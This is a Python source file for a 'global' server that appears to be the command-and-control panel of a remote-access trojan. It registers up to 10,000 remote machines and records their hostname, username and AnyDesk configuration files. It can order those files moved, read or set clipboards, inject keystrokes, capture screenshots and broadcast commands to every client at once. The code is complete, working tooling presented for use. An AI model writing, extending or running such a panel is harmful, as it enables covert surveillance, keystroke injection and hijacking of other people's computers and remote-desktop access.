#!/usr/bin/env python3
"""
AnyDesk Server - Global Server for Worldwide Client Management
Single server instance that controls all clients worldwide.
"""

import socket
import json
import threading
import time
import logging
import hashlib
import os
from datetime import datetime
from collections import defaultdict
from pathlib import Path
import argparse


class AnyDeskServer:
    def __init__(self, host='0.0.0.0', port=8888, auth_key=None, max_clients=10000):
        self.host = host
        self.port = port
        self.auth_key = auth_key
        self.max_clients = max_clients
        self.clients = {}  # client_id -> client_info
        self.client_sockets = {}  # client_id -> socket
        self.running = True
        self.lock = threading.Lock()
        self.stats = {
            'total_connections': 0,
            'active_connections': 0,
            'total_commands_sent': 0,
            'total_commands_failed': 0,
            'start_time': datetime.now().isoformat()
        }
        
        # Setup logging
        log_dir = Path('logs')
        log_dir.mkdir(exist_ok=True)
        log_file = log_dir / f'server_{datetime.now().strftime("%Y%m%d")}.log'
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        self.logger.info(f"Server initialized on {host}:{port}")
        if auth_key:
            self.logger.info("Authentication enabled")
        
    def verify_auth(self, message_data):
        """Verify client authentication if enabled."""
        if not self.auth_key:
            return True
        
        client_auth = message_data.get('auth_key', '')
        # Simple hash comparison (in production, use proper authentication)
        expected_hash = hashlib.sha256(self.auth_key.encode()).hexdigest()
        return client_auth == expected_hash
    
    def handle_client(self, client_socket, address):
        """Handle individual client connection."""
        client_id = None
        client_ip = address[0]
        
        try:
            with self.lock:
                self.stats['total_connections'] += 1
                self.stats['active_connections'] += 1
            
            self.logger.info(f"New connection from {client_ip}:{address[1]}")
            print(f"New connection from {client_ip}:{address[1]}")
            
            # Set longer timeout for internet connections
            client_socket.settimeout(30.0)
            
            while self.running:
                try:
                    data = client_socket.recv(4096).decode('utf-8')
                    if not data:
                        break
                    
                    # Handle multiple JSON messages
                    for line in data.strip().split('\n'):
                        if not line:
                            continue
                        
                        try:
                            message = json.loads(line)
                            client_id = message.get('client_id', 'unknown')
                            msg_type = message.get('type', '')
                            msg_data = message.get('data', {})
                            
                            # Verify authentication for registration
                            if msg_type == 'register':
                                if not self.verify_auth(msg_data):
                                    self.logger.warning(f"Authentication failed for {client_ip}")
                                    error_msg = json.dumps({'type': 'error', 'message': 'Authentication failed'}) + '\n'
                                    client_socket.sendall(error_msg.encode('utf-8'))
                                    break
                            
                            with self.lock:
                                if msg_type == 'register':
                                    # Check if we've reached max clients
                                    if len(self.clients) >= self.max_clients:
                                        self.logger.warning(f"Maximum clients reached ({self.max_clients})")
                                        error_msg = json.dumps({'type': 'error', 'message': 'Server at capacity'}) + '\n'
                                        client_socket.sendall(error_msg.encode('utf-8'))
                                        break
                                    
                                    self.clients[client_id] = {
                                        'client_id': client_id,
                                        'ip_address': client_ip,
                                        'port': address[1],
                                        'address': address,
                                        'system_info': msg_data.get('system_info', {}),
                                        'anydesk_status': msg_data.get('anydesk_status', {}),
                                        'first_seen': datetime.now().isoformat(),
                                        'last_seen': datetime.now().isoformat(),
                                        'connected': True,
                                        'connection_count': 1
                                    }
                                    self.client_sockets[client_id] = client_socket
                                    self.logger.info(f"Client registered: {client_id} from {client_ip}")
                                    print(f"Client registered: {client_id} from {client_ip}")
                                
                                elif msg_type == 'heartbeat':
                                    if client_id in self.clients:
                                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                                        self.clients[client_id]['system_info'] = msg_data.get('system_info', {})
                                        self.clients[client_id]['anydesk_status'] = msg_data.get('anydesk_status', {})
                                        self.clients[client_id]['ip_address'] = client_ip
                                
                                elif msg_type == 'status_response':
                                    if client_id in self.clients:
                                        self.clients[client_id]['system_info'] = msg_data.get('system_info', {})
                                        self.clients[client_id]['anydesk_status'] = msg_data.get('anydesk_status', {})
                                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                                
                                elif msg_type == 'move_files_response':
                                    if client_id in self.clients:
                                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                                        print(f"Move files response from {client_id}: {msg_data.get('success', False)}")
                                
                                elif msg_type == 'clipboard_response':
                                    if client_id in self.clients:
                                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                                        if msg_data.get('success'):
                                            if 'content' in msg_data:
                                                print(f"Clipboard from {client_id}: {msg_data.get('content', '')[:100]}")
                                            else:
                                                print(f"Clipboard set on {client_id}: Success")
                                        else:
                                            print(f"Clipboard error from {client_id}: {msg_data.get('error', 'Unknown')}")
                                
                                elif msg_type == 'keyboard_response':
                                    if client_id in self.clients:
                                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                                        if msg_data.get('success'):
                                            print(f"Keyboard command on {client_id}: Success")
                                        else:
                                            print(f"Keyboard error from {client_id}: {msg_data.get('error', 'Unknown')}")
                                
                                elif msg_type == 'screenshot_response':
                                    if client_id in self.clients:
                                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                                        if msg_data.get('success'):
                                            width = msg_data.get('width', 0)
                                            height = msg_data.get('height', 0)
                                            img_base64 = msg_data.get('image', '')
                                            img_size = len(img_base64) if img_base64 else 0
                                            
                                            # Save screenshot to file
                                            try:
                                                import base64
                                                screenshots_dir = Path('screenshots')
                                                screenshots_dir.mkdir(exist_ok=True)
                                                
                                                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                                                safe_client_id = client_id.replace(' ', '_').replace('\\', '_').replace('/', '_')
                                                filename = screenshots_dir / f"{safe_client_id}_{timestamp}.png"
                                                
                                                img_data = base64.b64decode(img_base64)
                                                with open(filename, 'wb') as f:
                                                    f.write(img_data)
                                                
                                                print(f"Screenshot from {client_id}: {width}x{height} ({img_size//1024}KB) - Saved to {filename}")
                                            except Exception as e:
                                                print(f"Screenshot from {client_id}: {width}x{height} ({img_size//1024}KB) - Failed to save: {e}")
                                        else:
                                            print(f"Screenshot error from {client_id}: {msg_data.get('error', 'Unknown')}")
                                
                                elif msg_type == 'pong':
                                    if client_id in self.clients:
                                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                                
                                elif msg_type == 'shutdown_response':
                                    print(f"Client {client_id} shutting down")
                                    break
                                
                                elif msg_type == 'error':
                                    print(f"Error from {client_id}: {msg_data.get('message', 'Unknown error')}")
                        
                        except json.JSONDecodeError as e:
                            print(f"JSON decode error: {e}")
                            continue
                
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"Error handling client {address}: {e}")
                    break
        
        except Exception as e:
            print(f"Error in client handler: {e}")
        finally:
            if client_id:
                with self.lock:
                    if client_id in self.clients:
                        self.clients[client_id]['connected'] = False
                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                    if client_id in self.client_sockets:
                        del self.client_sockets[client_id]
                    self.stats['active_connections'] = max(0, self.stats['active_connections'] - 1)
            
            client_socket.close()
            self.logger.info(f"Client {client_ip}:{address[1]} disconnected")
            print(f"Client {client_ip}:{address[1]} disconnected")
    
    def send_command(self, client_id, command_type, data=None):
        """Send command to specific client."""
        with self.lock:
            if client_id not in self.client_sockets:
                return False
            
            socket_obj = self.client_sockets[client_id]
            command = {
                'type': command_type,
                'data': data or {}
            }
            
            try:
                message = json.dumps(command) + '\n'
                socket_obj.sendall(message.encode('utf-8'))
                with self.lock:
                    self.stats['total_commands_sent'] += 1
                return True
            except Exception as e:
                with self.lock:
                    self.stats['total_commands_failed'] += 1
                self.logger.error(f"Error sending command to {client_id}: {e}")
                print(f"Error sending command to {client_id}: {e}")
                return False
    
    def broadcast_command(self, command_type, data=None):
        """Send command to all connected clients."""
        with self.lock:
            client_ids = list(self.client_sockets.keys())
        
        results = {}
        for client_id in client_ids:
            results[client_id] = self.send_command(client_id, command_type, data)
        return results
    
    def start_server(self):
        """Start the server."""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Increase buffer sizes for better performance
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        server_socket.bind((self.host, self.port))
        server_socket.listen(100)  # Increased backlog for many connections
        server_socket.settimeout(1.0)
        
        self.logger.info(f"Server started on {self.host}:{self.port}")
        self.logger.info(f"Maximum clients: {self.max_clients}")
        print(f"Server started on {self.host}:{self.port}")
        print(f"Maximum clients: {self.max_clients}")
        print("Waiting for clients from around the world...")
        
        while self.running:
            try:
                client_socket, address = server_socket.accept()
                client_socket.settimeout(5.0)
                
                # Start new thread for each client
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_thread.start()
            
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"Server error: {e}")
        
        server_socket.close()
        print("Server stopped.")
    
    def get_statistics(self):
        """Get server statistics."""
        with self.lock:
            connected_count = sum(1 for c in self.clients.values() if c.get('connected', False))
            return {
                **self.stats,
                'total_clients': len(self.clients),
                'connected_clients': connected_count,
                'disconnected_clients': len(self.clients) - connected_count,
                'uptime_seconds': (datetime.now() - datetime.fromisoformat(self.stats['start_time'])).total_seconds()
            }
    
    def list_clients(self):
        """List all registered clients."""
        with self.lock:
            if not self.clients:
                print("No clients registered.")
                return
            
            stats = self.get_statistics()
            print(f"\n{'=' * 100}")
            print(f"Total Clients: {stats['total_clients']} | Connected: {stats['connected_clients']} | Disconnected: {stats['disconnected_clients']}")
            print(f"{'=' * 100}")
            print(f"{'Client ID':<30} {'IP Address':<18} {'Hostname':<20} {'Username':<15} {'Status':<12}")
            print(f"{'=' * 100}")
            
            for client_id, info in self.clients.items():
                system_info = info.get('system_info', {})
                hostname = system_info.get('hostname', 'unknown')
                username = system_info.get('username', 'unknown')
                ip_address = info.get('ip_address', 'unknown')
                status = "Connected" if info.get('connected', False) else "Disconnected"
                
                print(f"{client_id:<30} {ip_address:<18} {hostname:<20} {username:<15} {status:<12}")
            
            print(f"{'=' * 100}\n")
    
    def show_client_details(self, client_id):
        """Show detailed information about a specific client."""
        with self.lock:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            info = self.clients[client_id]
            print(f"\n{'=' * 100}")
            print(f"Client Details: {client_id}")
            print(f"{'=' * 100}")
            print(f"Status: {'Connected' if info.get('connected', False) else 'Disconnected'}")
            print(f"IP Address: {info.get('ip_address', 'Unknown')}")
            print(f"First Seen: {info.get('first_seen', 'Unknown')}")
            print(f"Last Seen: {info.get('last_seen', 'Never')}")
            print(f"Connection Count: {info.get('connection_count', 0)}")
            
            system_info = info.get('system_info', {})
            print(f"\nSystem Information:")
            print(f"  Hostname: {system_info.get('hostname', 'Unknown')}")
            print(f"  Username: {system_info.get('username', 'Unknown')}")
            print(f"  OS: {system_info.get('os', 'Unknown')}")
            print(f"  OS Version: {system_info.get('os_version', 'Unknown')}")
            
            anydesk_status = info.get('anydesk_status', {})
            print(f"\nAnyDesk Status:")
            print(f"  Files Exist: {anydesk_status.get('files_exist', False)}")
            
            roaming = anydesk_status.get('roaming', {})
            if roaming:
                print(f"\n  Roaming Folder Files:")
                for filename, file_info in roaming.items():
                    exists = file_info.get('exists', False)
                    size = file_info.get('size', 0)
                    print(f"    {filename}: {'Exists' if exists else 'Missing'} (Size: {size} bytes)")
            
            programdata = anydesk_status.get('programdata', {})
            if programdata:
                print(f"\n  ProgramData Folder Files:")
                for filename, file_info in programdata.items():
                    exists = file_info.get('exists', False)
                    size = file_info.get('size', 0)
                    print(f"    {filename}: {'Exists' if exists else 'Missing'} (Size: {size} bytes)")
            
            print(f"{'=' * 100}\n")
    
    def export_clients(self, filename='clients_export.json'):
        """Export all client data to JSON file."""
        with self.lock:
            export_data = {
                'export_time': datetime.now().isoformat(),
                'total_clients': len(self.clients),
                'clients': self.clients.copy()
            }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"Exported {len(self.clients)} clients to {filename}")
        print(f"Exported {len(self.clients)} clients to {filename}")
    
    def interactive_mode(self):
        """Run interactive command interface."""
        print("\n" + "=" * 100)
        print("AnyDesk Global Server - Interactive Mode")
        print("=" * 100)
        print("Commands:")
        print("  list              - List all clients")
        print("  stats             - Show server statistics")
        print("  show <client_id>  - Show detailed client information")
        print("  status <client_id> - Request status update from client")
        print("  move <client_id>  - Request file move operation")
        print("  ping <client_id>  - Ping client")
        print("  clipboard <client_id> [get|set <text>] - Get or set clipboard")
        print("  keyboard <client_id> <keys> - Send keyboard input")
        print("  keys <client_id> <combination> - Send key combination (e.g., ctrl+c)")
        print("  screen <client_id> - Get screenshot from client")
        print("  broadcast <cmd>   - Broadcast command to all clients (status/move/ping)")
        print("  export [filename] - Export all client data to JSON file")
        print("  quit              - Exit server")
        print("=" * 100)
        print()
        
        while self.running:
            try:
                command = input("Server> ").strip().split()
                if not command:
                    continue
                
                cmd = command[0].lower()
                
                if cmd == 'quit' or cmd == 'exit':
                    self.running = False
                    break
                
                elif cmd == 'list':
                    self.list_clients()
                
                elif cmd == 'stats' or cmd == 'statistics':
                    stats = self.get_statistics()
                    print(f"\n{'=' * 100}")
                    print("Server Statistics")
                    print(f"{'=' * 100}")
                    print(f"Total Connections: {stats['total_connections']}")
                    print(f"Active Connections: {stats['active_connections']}")
                    print(f"Total Clients: {stats['total_clients']}")
                    print(f"Connected Clients: {stats['connected_clients']}")
                    print(f"Disconnected Clients: {stats['disconnected_clients']}")
                    print(f"Total Commands Sent: {stats['total_commands_sent']}")
                    print(f"Failed Commands: {stats['total_commands_failed']}")
                    uptime_hours = stats['uptime_seconds'] / 3600
                    print(f"Uptime: {uptime_hours:.2f} hours")
                    print(f"Server Started: {stats['start_time']}")
                    print(f"{'=' * 100}\n")
                
                elif cmd == 'export':
                    filename = command[1] if len(command) > 1 else 'clients_export.json'
                    self.export_clients(filename)
                
                elif cmd == 'show' and len(command) > 1:
                    self.show_client_details(command[1])
                
                elif cmd == 'status' and len(command) > 1:
                    client_id = command[1]
                    if self.send_command(client_id, 'get_status'):
                        print(f"Status request sent to {client_id}")
                        time.sleep(1)  # Wait for response
                        self.show_client_details(client_id)
                    else:
                        print(f"Failed to send command to {client_id}")
                
                elif cmd == 'move' and len(command) > 1:
                    client_id = command[1]
                    if self.send_command(client_id, 'move_files'):
                        print(f"Move files command sent to {client_id}")
                    else:
                        print(f"Failed to send command to {client_id}")
                
                elif cmd == 'ping' and len(command) > 1:
                    client_id = command[1]
                    if self.send_command(client_id, 'ping'):
                        print(f"Ping sent to {client_id}")
                    else:
                        print(f"Failed to send command to {client_id}")
                
                elif cmd == 'clipboard' and len(command) > 2:
                    client_id = command[1]
                    action = command[2].lower()
                    if action == 'get':
                        if self.send_command(client_id, 'get_clipboard'):
                            print(f"Clipboard request sent to {client_id}")
                            time.sleep(0.5)  # Wait for response
                        else:
                            print(f"Failed to send command to {client_id}")
                    elif action == 'set' and len(command) > 3:
                        text = ' '.join(command[3:])
                        if self.send_command(client_id, 'set_clipboard', {'content': text}):
                            print(f"Clipboard set command sent to {client_id}")
                        else:
                            print(f"Failed to send command to {client_id}")
                    else:
                        print("Usage: clipboard <client_id> [get|set <text>]")
                
                elif cmd == 'keyboard' and len(command) > 2:
                    client_id = command[1]
                    keys = ' '.join(command[2:])
                    if self.send_command(client_id, 'send_keys', {'keys': keys, 'interval': 0.1}):
                        print(f"Keyboard input sent to {client_id}: {keys}")
                    else:
                        print(f"Failed to send command to {client_id}")
                
                elif cmd == 'keys' and len(command) > 2:
                    client_id = command[1]
                    combination = command[2]
                    if self.send_command(client_id, 'send_key_combination', {'keys': combination}):
                        print(f"Key combination sent to {client_id}: {combination}")
                    else:
                        print(f"Failed to send command to {client_id}")
                
                elif cmd == 'screen' and len(command) > 1:
                    client_id = command[1]
                    if self.send_command(client_id, 'get_screen'):
                        print(f"Screenshot request sent to {client_id}")
                        time.sleep(1)  # Wait for response
                    else:
                        print(f"Failed to send command to {client_id}")
                
                elif cmd == 'broadcast' and len(command) > 1:
                    sub_cmd = command[1].lower()
                    if sub_cmd in ['status', 'move', 'ping']:
                        results = self.broadcast_command(f'get_status' if sub_cmd == 'status' else f'move_files' if sub_cmd == 'move' else 'ping')
                        print(f"Broadcast {sub_cmd} to {sum(results.values())} clients")
                    else:
                        print("Invalid broadcast command. Use: status, move, or ping")
                
                else:
                    print("Invalid command. Type 'quit' to exit.")
            
            except KeyboardInterrupt:
                print("\nShutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"Error: {e}")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description='AnyDesk Global Server')
    parser.add_argument('--host', default='0.0.0.0', help='Server host (default: 0.0.0.0 - listens on all interfaces)')
    parser.add_argument('--port', type=int, default=8888, help='Server port (default: 8888)')
    parser.add_argument('--auth-key', default=None, help='Authentication key for clients (optional but recommended)')
    parser.add_argument('--max-clients', type=int, default=10000, help='Maximum number of clients (default: 10000)')
    parser.add_argument('--no-interactive', action='store_true', help='Run server without interactive mode')
    
    args = parser.parse_args()
    
    server = AnyDeskServer(
        host=args.host, 
        port=args.port,
        auth_key=args.auth_key,
        max_clients=args.max_clients
    )
    
    # Start server in background thread
    server_thread = threading.Thread(target=server.start_server, daemon=True)
    server_thread.start()
    
    # Run interactive mode
    if not args.no_interactive:
        time.sleep(1)  # Give server time to start
        server.interactive_mode()
    else:
        print("Server running in background mode. Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.running = False
            print("\nShutting down server...")


if __name__ == "__main__":
    main()

